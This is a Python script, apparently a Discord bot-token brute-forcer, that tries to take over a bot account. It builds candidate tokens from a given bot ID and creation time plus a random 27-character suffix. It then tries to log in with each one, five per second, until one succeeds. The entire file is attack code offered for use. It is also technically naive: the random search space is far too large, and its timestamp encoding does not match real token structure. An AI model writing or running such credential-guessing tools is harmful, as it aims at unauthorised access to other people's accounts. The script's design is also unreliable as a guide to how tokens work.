## Dont skid this ya sonnana bitch ##
import discord
import base64
import time
import asyncio
import random
import string
import datetime

async def attempt_login(token):
    client = discord.Client(intents=discord.Intents.default())
    try:
        await client.login(token)
        print(f"SUCCESS: Logged in with token: {token}")
        await client.close()
        return True
    except discord.LoginFailure as e:
        print(f"  FAILED: Attempt with token: {token} - {e}")
        return False
    except Exception as e:
        print(f"  ERROR: Unexpected error during login attempt: {e}")
        return False

def generate_combinations(base64_id, encoded_creation_time, length=27):
    characters = string.ascii_letters + string.digits + '_-'
    while True:
        random_part = ''.join(random.choice(characters) for _ in range(length))
        yield f"{base64_id}.{encoded_creation_time}.{random_part}"

def base64_encode_timestamp(timestamp):
    timestamp_bytes = int(timestamp).to_bytes(4, byteorder='big')
    encoded = base64.b64encode(timestamp_bytes).decode('ascii')
    return encoded.rstrip('=')

async def main():
    bot_id_str = input("Enter the bot's ID: ")

    try:
        bot_id = int(bot_id_str)
        bot_id_bytes = str(bot_id).encode('ascii')
        base64_bytes = base64.b64encode(bot_id_bytes)
        base64_id = base64_bytes.decode('ascii')
        print(f"Base64 encoded Bot ID: {base64_id}")

    except ValueError:
        print("Invalid Bot ID.  The Bot ID must be a number.")
        return

    while True:
        creation_time_str = input("Enter the bot's creation time (YYYY-MM-DD HH:MM:SS, UTC): ")
        try:
            creation_time = datetime.datetime.strptime(creation_time_str, "%Y-%m-%d %H:%M:%S")
            creation_time = creation_time.replace(tzinfo=datetime.timezone.utc)
            creation_timestamp = creation_time.timestamp()
            encoded_creation_time = base64_encode_timestamp(creation_timestamp)

            print(f"Base64 encoded Creation Time: {encoded_creation_time}")
            break
        except ValueError:
            print("Invalid date/time format. Please use YYYY-MM-DD HH:MM:SS in UTC.")

    attempts_per_second = 5
    combination_generator = generate_combinations(base64_id, encoded_creation_time)

    while True:
        tasks = []
        for _ in range(attempts_per_second):
            token = next(combination_generator)
            tasks.append(attempt_login(token))

        results = await asyncio.gather(*tasks)

        if any(results):
            print("Token Found! Check the logs for token details")
            break

        await asyncio.sleep(1)

if __name__ == "__main__":
    asyncio.run(main())
